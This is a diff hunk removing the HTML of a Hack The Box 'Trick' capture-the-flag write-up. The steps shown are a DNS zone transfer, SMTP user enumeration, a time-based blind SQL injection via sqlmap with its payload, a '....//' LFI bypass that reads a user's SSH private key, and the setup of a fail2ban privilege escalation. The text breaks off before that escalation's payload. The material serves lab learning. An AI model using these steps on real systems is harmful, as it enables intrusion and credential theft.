@@ -1,167 +1,549 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Trick | kanyo's blog</title><meta property="og:title" content="HTB: Trick | kanyo's blog"><meta name=twitter:title content="HTB: Trick | kanyo's blog"><meta itemprop=name content="HTB: Trick | kanyo's blog"><meta name=application-name content="HTB: Trick | kanyo's blog"><meta property="og:site_name" content><meta name=description content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><meta itemprop=description content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><meta property="og:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><meta name=twitter:description content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-trick/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-trick/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Trick"><meta property="og:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-08T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-08T00:00:00+00:00"><meta property="article:tag" content="Fail2ban"><meta property="article:tag" content="Lfi"><meta property="article:tag" content="Sqli"><meta property="article:tag" content="Linux"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Trick"><meta name=twitter:description content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael's SSH key. The privilege escalation abuses write access to fail2ban's action configs and a NOPASSWD restart to plant a SUID shell."><link rel=canonical href=https://chaelsoo.me/writeups/htb-trick/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Trick</h1><div class=post-meta><time datetime=2026-06-08T00:00:00+00:00 itemprop=datePublished>8 Jun 2026</time></div></header><img src=/images/writeups/htb-trick/htb-trick-pwned.png alt="HTB: Trick" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#payroll-sqli>Payroll SQLi</a></li><li><a href=#lfi-on-preprod-marketing>LFI on preprod-marketing</a></li><li><a href=#privilege-escalation-fail2ban>Privilege Escalation: fail2ban</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>An Easy box but one that makes you work for it in an unexpected direction. Port 80 is a static placeholder page with nothing on it. The real surface is DNS: zone transfer hands you a subdomain, that subdomain has a login form with a time-based blind SQLi, you get credentials, but the LFI on that same app is filtered. The actual LFI is on a second subdomain you only find by fuzzing a prefix pattern. That subdomain reads michael&rsquo;s SSH key, you get in, and the privilege escalation is a clean abuse of fail2ban&rsquo;s action config combined with <code>sudo</code> restart rights. The credentials from payroll end up being almost irrelevant to the root path, which is a bit annoying in hindsight, but the DNS zone transfer and the fail2ban trick are both things worth keeping in your toolkit.</p><h2 id=recon>Recon</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ sudo nmap -sV -sC -T4 <span class=nv>$DC</span>
-</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-06-08 10:37 +0100
-</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.227.180
-</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>4.2s latency<span class=o>)</span>.
-</span></span><span class=line><span class=cl>Not shown: <span class=m>501</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>, <span class=m>495</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
-</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
-</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class=o>(</span>protocol 2.0<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span class=o>(</span>RSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span class=o>(</span>ECDSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span class=o>(</span>ED25519<span class=o>)</span>
-</span></span><span class=line><span class=cl>25/tcp open  smtp?
-</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: Couldn<span class=err>&#39;</span>t establish connection on port <span class=m>25</span>
-</span></span><span class=line><span class=cl>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span class=o>(</span>Debian Linux<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid: 
-</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
-</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.14.2
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.14.2
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Coming Soon - Start Bootstrap Theme
-</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Four ports. Port 80 is a &ldquo;coming soon&rdquo; placeholder. Port 53 is BIND, which is notable. A DNS server running on a box like this usually means there are zones to enumerate. Port 25 is SMTP but didn&rsquo;t respond to connection. I checked SMTP first to see if VRFY enumeration would work:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>VRFY root
-</span></span><span class=line><span class=cl><span class=m>252</span> 2.0.0 root
-</span></span><span class=line><span class=cl>VRFY admin
-</span></span><span class=line><span class=cl><span class=m>550</span> 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown in <span class=nb>local</span> recipient table
-</span></span><span class=line><span class=cl>VRFY user
-</span></span><span class=line><span class=cl><span class=m>550</span> 5.1.1 &lt;user&gt;: Recipient address rejected: User unknown in <span class=nb>local</span> recipient table
-</span></span><span class=line><span class=cl>VRFY www-data
-</span></span><span class=line><span class=cl><span class=m>252</span> 2.0.0 www-data
-</span></span></code></pre></div><p><code>root</code> and <code>www-data</code> exist. Useful context, but no direct attack path from here.</p><p>Vhost fuzzing on port 80 found nothing useful. Port 53 is the more interesting angle. DNS servers that are misconfigured to allow zone transfers will hand you the complete DNS record set for a zone, every hostname, every subdomain, in a single query. <code>dig axfr</code> sends a zone transfer request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ dig axfr @<span class=nv>$DC</span> trick.htb
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.20.23 &lt;&lt;&gt;&gt; axfr @10.129.227.180 trick.htb
-</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
-</span></span><span class=line><span class=cl>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span class=m>5</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
-</span></span><span class=line><span class=cl>trick.htb.		604800	IN	NS	trick.htb.
-</span></span><span class=line><span class=cl>trick.htb.		604800	IN	A	127.0.0.1
-</span></span><span class=line><span class=cl>trick.htb.		604800	IN	AAAA	::1
-</span></span><span class=line><span class=cl>preprod-payroll.trick.htb. <span class=m>604800</span> IN	CNAME	trick.htb.
-</span></span><span class=line><span class=cl>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span class=m>5</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
-</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>267</span> msec
-</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.129.227.180#53<span class=o>(</span>10.129.227.180<span class=o>)</span> <span class=o>(</span>TCP<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Mon Jun <span class=m>08</span> 10:55:51 CET <span class=m>2026</span>
-</span></span><span class=line><span class=cl><span class=p>;;</span> XFR size: <span class=m>6</span> records <span class=o>(</span>messages 1, bytes 231<span class=o>)</span>
-</span></span></code></pre></div><p>One real entry: <code>preprod-payroll.trick.htb</code>.</p><h2 id=payroll-sqli>Payroll SQLi</h2><p>Added it to <code>/etc/hosts</code> and opened it:</p><p><img src=/images/writeups/htb-trick/web-preprod-payroll-login.png alt="preprod-payroll.trick.htb login page with username and password fields"></p><p>A login form. Time-based blind SQL injection is the type where the database pauses execution for a set number of seconds when the condition is true. The attacker infers data character by character from whether the response is delayed. It&rsquo;s slow but reliable when error-based injection is suppressed. I saved the login request from Burp and pointed sqlmap at it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ sqlmap -r login_req 
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> parsing HTTP request from <span class=s1>&#39;login_req&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> checking <span class=k>if</span> the target is protected by some kind of WAF/IPS
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> the target URL content is stable
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> target URL content is stable
-</span></span><span class=line><span class=cl><span class=o>[</span>11:03:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> POST parameter <span class=s1>&#39;username&#39;</span> is dynamic
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:08:20<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> checking <span class=k>if</span> the injection point on POST parameter <span class=s1>&#39;username&#39;</span> is a <span class=nb>false</span> positive
-</span></span><span class=line><span class=cl>POST parameter <span class=s1>&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class=o>(</span><span class=k>if</span> any<span class=o>)</span>? <span class=o>[</span>y/N<span class=o>]</span> N
-</span></span><span class=line><span class=cl>sqlmap identified the following injection point<span class=o>(</span>s<span class=o>)</span> with a total of <span class=m>1304</span> HTTP<span class=o>(</span>s<span class=o>)</span> requests:
-</span></span><span class=line><span class=cl>---
-</span></span><span class=line><span class=cl>Parameter: username <span class=o>(</span>POST<span class=o>)</span>
-</span></span><span class=line><span class=cl>    Type: time-based blind
-</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
-</span></span><span class=line><span class=cl>    Payload: <span class=nv>username</span><span class=o>=</span>root<span class=s1>&#39; AND (SELECT 5929 FROM (SELECT(SLEEP(5)))BHkw) AND &#39;</span>VzCS<span class=s1>&#39;=&#39;</span>VzCS<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>root
-</span></span><span class=line><span class=cl>---
-</span></span><span class=line><span class=cl><span class=o>[</span>11:08:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
-</span></span></code></pre></div><p>Confirmed. Dumped databases and found <code>payroll_db</code>, then enumerated its tables:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ sqlmap -r login_req --dbs --batch
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:41:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: payroll_db
-</span></span><span class=line><span class=cl>available databases <span class=o>[</span>2<span class=o>]</span>:
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> information_schema
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> payroll_db
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ sqlmap -r login_req -D payroll_db --tables --batch
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:57:27<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> adjusting <span class=nb>time</span> delay to <span class=m>1</span> second due to good response <span class=nb>times</span>
-</span></span><span class=line><span class=cl><span class=m>1</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>11:57:30<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: position
-</span></span><span class=line><span class=cl><span class=o>[</span>11:58:06<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: employee
-</span></span><span class=line><span class=cl><span class=o>[</span>11:58:40<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: department
-</span></span><span class=line><span class=cl><span class=o>[</span>11:59:22<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: payroll_items
-</span></span><span class=line><span class=cl><span class=o>[</span>12:00:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: attendance
-</span></span><span class=line><span class=cl><span class=o>[</span>12:00:59<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: employee_deductions
-</span></span><span class=line><span class=cl><span class=o>[</span>12:02:20<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: employee_allowances
-</span></span><span class=line><span class=cl><span class=o>[</span>12:03:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: users
-</span></span><span class=line><span class=cl><span class=o>[</span>12:03:29<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: deductions
-</span></span><span class=line><span class=cl><span class=o>[</span>12:04:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: payrol
-</span></span></code></pre></div><p><code>users</code> table. Dumped it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/trick ❯ sqlmap -r login_req -D payroll_db -T users -C username,password --dump --batch
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>12:10:19<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> adjusting <span class=nb>time</span> delay to <span class=m>1</span> second due to good response <span class=nb>times</span>
-</span></span><span class=line><span class=cl>SuperGucciRainbowCake
-</span></span><span class=line><span class=cl><span class=o>[</span>12:11:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: Enemigosss
-</span></span><span class=line><span class=cl>Database: payroll_db
-</span></span><span class=line><span class=cl>Table: users
-</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>1</span> entry<span class=o>]</span>
-</span></span><span class=line><span class=cl>+------------+-----------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> username   <span class=p>|</span> password              <span class=p>|</span>
-</span></span><span class=line><span class=cl>+------------+-----------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> Enemigosss <span class=p>|</span> SuperGucciRainbowCake <span class=p>|</span>
-</span></span><span class=line><span class=cl>+------------+-----------------------+
-</span></span></code></pre></div><p>Logged in:</p><p><img src=/images/writeups/htb-trick/web-payroll-admin-panel.png alt="Payroll admin panel after login showing employee records and management sidebar"></p><p>The payroll app had a <code>page=</code> parameter that looked like it was including files. I tried LFI immediately - <code>page=/etc/passwd</code>, <code>page=../../../etc/passwd</code>, various traversal sequences. All filtered. None of them returned file content.</p><h2 id=lfi-on-preprod-marketing>LFI on preprod-marketing</h2><p>The subdomain name <code>preprod-payroll</code> is a naming convention. Payroll is the noun, preprod is the prefix. If there are other apps, they&rsquo;d follow the same pattern: <code>preprod-&lt;appname></code>. I fuzzed that prefix:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~ ❯ ffuf -u http://trick.htb -H <span class=s2>&#34;Host: preprod-FUZZ.trick.htb&#34;</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fw <span class=m>1697</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>marketing               <span class=o>[</span>Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 71ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>payroll                 <span class=o>[</span>Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 92ms<span class=o>]</span>
-</span></span></code></pre></div><p><code>preprod-marketing.trick.htb</code>. Also 200. This one also had a <code>page=</code> parameter, and this time the LFI wasn&rsquo;t filtered:</p><p><img src=/images/writeups/htb-trick/web-preprod-marketing-lfi.png alt="preprod-marketing.trick.htb with page= parameter returning file contents via LFI"></p><p>The traversal that worked used <code>....//</code> sequences instead of <code>../</code>. The double-dot double-slash pattern bypasses naive string replacement that only strips <code>../</code> once: replacing <code>....//</code> gives <code>../</code>, so one round of filtering leaves a working traversal intact.</p><p><code>/etc/passwd</code> confirmed two shell users:</p><p><img src=/images/writeups/htb-trick/lfi-etc-passwd-output.png alt="/etc/passwd contents showing root and michael with /bin/bash login shells"></p><p>From there I read michael&rsquo;s SSH key. The <code>authorized_keys</code> request confirmed SSH was set up, and reading <code>/home/michael/.ssh/id_rsa</code> gave the private key:</p><p><img src=/images/writeups/htb-trick/burp-lfi-id-rsa-response.png alt="Burp Suite showing LFI response with michael’s RSA private key material from /home/michael/.ssh/"></p><p>Saved the key, set permissions, SSH&rsquo;d in as michael. User flag.</p><h2 id=privilege-escalation-fail2ban>Privilege Escalation: fail2ban</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>michael@trick:~$ whoami<span class=p>;</span> id
-</span></span><span class=line><span class=cl>michael
-</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>michael<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>michael<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>michael<span class=o>)</span>,1002<span class=o>(</span>security<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>michael@trick:~$ sudo -l
-</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> michael on trick:
-</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
-</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>User michael may run the following commands on trick:
-</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /etc/init.d/fail2ban restart
-</span></span></code></pre></div><p>Two things: member of <code>security</code> group, and can restart fail2ban as root without a password. Let me explain why that&rsquo;s exploitable.</p><p><em>Reference: <a href=https://juggernaut-sec.com/fail2ban-lpe/>juggernaut-sec.com/fail2ban-lpe</a></em></p><p>fail2ban monitors log files for brute-force patterns and responds by executing a configured <em>action</em>, typically an iptables rule to block the offending IP. Those actions are shell commands defined in config files under <code>/etc/fail2ban/action.d/</code>. When fail2ban is restarted it re-reads all config from disk. The <code>security</code> group controls the <code>action.d/</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>michael@trick:~$ ls -la /etc/fail2ban/
-</span></span><span class=line><span class=cl>total <span class=m>76</span>
-</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>6</span> root root      <span class=m>4096</span> Jun  <span class=m>8</span> 13:36 .
-</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>126</span> root root     <span class=m>12288</span> Jun  <span class=m>8</span> 13:24 ..
-</span></span><span class=line><span class=cl>drwxrwx---   <span class=m>2</span> root security  <span class=m>4096</span> Jun  <span class=m>8</span> 13:36 action.d
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root      <span class=m>2334</span> Jun  <span class=m>8</span> 13:36 fail2ban.conf
-</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root      <span class=m>4096</span> Jun  <span class=m>8</span> 13:36 fail2ban.d
-</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>3</span> root root      <span class=m>4096</span> Jun  <span class=m>8</span> 13:36 filter.d
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root     <span class=m>22908</span> Jun  <span class=m>8</span> 13:36 jail.conf
-</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root      <span class=m>4096</span> Jun  <span class=m>8</span> 13:36 jail.d
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root       <span class=m>645</span> Jun  <span class=m>8</span> 13:36 paths-arch.conf
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root      <span class=m>2827</span> Jun  <span class=m>8</span> 13:36 paths-common.conf
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root       <span class=m>573</span> Jun  <span class=m>8</span> 13:36 paths-debian.conf
-</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root       <span class=m>738</span> Jun  <span class=m>8</span> 13:36 paths-opensuse.conf
-</span></span></code></pre></div><p><code>action.d</code> is <code>rwxrwx---</code> owned by <code>root:security</code>. I can create and delete files there. The individual config files inside are owned by root with no write permissions for me, but the directory write permission means I can delete a file and replace it with one I control.</p><p>Checked <code>jail.conf</code> to understand which action file gets used and what the ban timing is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>michael@trick:~$ cat /etc/fail2ban/jail.conf <span class=p>|</span> grep -A5 <span class=s2>&#34;sshd&#34;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>sshd<span class=o>]</span>
-</span></span><span class=line><span class=cl><span class=nv>port</span>    <span class=o>=</span> ssh
-</span></span><span class=line><span class=cl><span class=nv>logpath</span> <span class=o>=</span> %<span class=o>(</span>sshd_log<span class=o>)</span>s
-</span></span><span class=line><span class=cl><span class=nv>backend</span> <span class=o>=</span> %<span class=o>(</span>sshd_backend<span class=o>)</span>s
-</span></span><span class=line><span class=cl><span class=nv>bantime</span> <span class=o>=</span> 10s
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>michael@trick:~$ grep <span class=s2>&#34;banaction&#34;</span> /etc/fail2ban/jail.conf <span class=p>|</span> head -5
-</span></span><span class=line><span class=cl><span class=nv>banaction</span> <span class=o>=</span> iptables-multiport
